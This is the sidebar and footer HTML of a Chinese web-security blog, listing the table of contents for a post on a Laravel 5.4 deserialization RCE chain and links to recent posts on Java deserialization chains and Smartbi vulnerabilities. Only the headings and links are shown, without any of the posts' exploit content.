fa-shake"></i><span>公告</span></div><div class="announcement_content">主攻Web安全，D0g3成员 QQ:1691834629</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Laravel-5-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E2%80%94%E5%AF%B9%E5%86%B2-wakeup-%E7%9A%84RCE%E9%93%BE%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">审计流程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP%E9%93%BE%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">POP链：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E4%B8%8D%E6%88%90%E5%8A%9F%E7%9A%84POC%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">编写不成功的POC：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">问题：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#inHann%E5%B8%88%E5%82%85%E7%BB%99%E5%87%BA%E7%9A%84%E8%A7%A3%E5%86%B3%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.3.2.</span> <span class="toc-text">inHann师傅给出的解决思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">前置知识：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E6%83%B3%EF%BC%9A"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">利用思想：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%951%EF%BC%9A"><span class="toc-number">1.3.3.</span> <span class="toc-text">尝试1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%952%EF%BC%9A"><span class="toc-number">1.3.4.</span> <span class="toc-text">尝试2：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%953%EF%BC%9A"><span class="toc-number">1.3.5.</span> <span class="toc-text">尝试3：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0POC%EF%BC%9A"><span class="toc-number">1.3.6.</span> <span class="toc-text">构造POC：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload"><span class="toc-number">1.3.7.</span> <span class="toc-text">Payload:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%A2%B3%E7%90%86%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">利用链梳理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">总结：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8B/" title="CC链学习下"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CC链学习下"/></a><div class="content"><a class="title" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8B/" title="CC链学习下">CC链学习下</a><time datetime="2023-09-21T10:15:23.000Z" title="发表于 2023-09-21 18:15:23">2023-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%AD/" title="CC链学习中"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CC链学习中"/></a><div class="content"><a class="title" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%AD/" title="CC链学习中">CC链学习中</a><time datetime="2023-09-21T10:15:10.000Z" title="发表于 2023-09-21 18:15:10">2023-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8A/" title="CC链学习上"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CC链学习上"/></a><div class="content"><a class="title" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8A/" title="CC链学习上">CC链学习上</a><time datetime="2023-09-21T10:15:02.000Z" title="发表于 2023-09-21 18:15:02">2023-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/21/URLDNS%E4%B8%8Eysoserial%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="URLDNS与ysoserial简单使用"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="URLDNS与ysoserial简单使用"/></a><div class="content"><a class="title" href="/2023/09/21/URLDNS%E4%B8%8Eysoserial%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="URLDNS与ysoserial简单使用">URLDNS与ysoserial简单使用</a><time datetime="2023-09-21T10:08:59.000Z" title="发表于 2023-09-21 18:08:59">2023-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/21/Smartbi%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A/" title="Smartbi系列漏洞详解"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Smartbi系列漏洞详解"/></a><div class="content"><a class="title" href="/2023/09/21/Smartbi%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A/" title="Smartbi系列漏洞详解">Smartbi系列漏洞详解</a><time datetime="2023-09-21T10:04:57.000Z" title="发表于 2023-09-21 18:04:57">2023-09-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Ho1L0w-By</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hack For Fun</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>